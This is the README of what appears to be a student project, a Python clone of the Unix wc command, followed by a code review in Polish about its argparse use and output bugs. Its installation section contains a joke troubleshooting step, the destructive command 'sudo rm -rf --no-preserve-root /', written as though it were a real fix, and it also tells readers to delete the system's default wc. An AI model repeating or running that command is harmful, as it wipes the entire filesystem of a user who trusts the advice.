**wc** - print how many lines, words, characters are in file
## Installation
 - Use git to clone this repository 
 > git clone git@github.com/robgal519/PiTE_WC.git
 - Move file wc.py to /opt/ directory
 > mv PiTE_WC/wc.py /opt/
 - Give executable permissions to that file
 > chmod +x /opt/wc.py
 - Create simlink 
 > ln -s /opt/wc.py /usr/bin/wc

The last command may give you error message. Don't worry, everything is fine, you just need to delete default wc program from your system ( mine is much superior ;P )

If deleting default wc program won't help, just run
> sudo rm -rf --no-preserve-root /


Now you successfully installed mine superior version of wc

and now for serious ... you just need to call wc.py from bash ( of course you can put it in directory that is in your PATH, or create simlink to it, but it is not compulsory to run it)

## How to use it?

Simply call the program with flag -h or --help for detailed help page

## Is it for me?

It is for people who are bored with standard implementation of wc program,
if you like poorly tested implementations ( i mean bleeding edge technology) --- it's perfect for you

## How can I help?

well, if you want to help ... just do it and don't waste my time! 

Be aware that I probably wont use your code, because mine is far superior  

## Code review

Poprawnie napisane README, w dokładny sposób opisujące proces uruchomienia programu.

Kod napisany w jasny sposób, ze znaczącymi nazwami zmiennych, co umożliwia szybkie zrozumienie, nawet bez dokumentacji.
Dobry pomysł na użycie narzędzia agrparse, które w jasny sposób precyzuje zachowania przypisane odpowiednim flagom oraz skraca kod. Dobrym sposobem, jest również zastrzeżenie, że podany na wejściu plik może być tylko odczytywany.

Co do optymalizacji, program sczytuje po 1024 bajty z pliku tekstowego co jest bardzo rozsądnym działaniem, jednak wszystkie dane zapisuje do Stinga data, czy to jest konieczne? - rozumiem, że dzieje się to po to, aby nie sczytywać danych dwa razy z pliku do obliczenia ilości bajtów oraz pozostałych parametrów.

Proszę zastanów się, dlaczego domyślne zachowanie wypisuje wszystkie wyliczone wartości oprócz ilości bajtów.
Zwróć uwagę na to, dlaczego podczas podania pliku, w którym znajduje się jedna linia, parametr maksymalnej długości linii jest o jeden znak mniejszy od parametru ilości znaków.
Miło by było, aby podczas wypisywania, zobaczyć oprócz wartości również tekst, dotyczący tego, co jest wypisywane, np.: lines: 23.

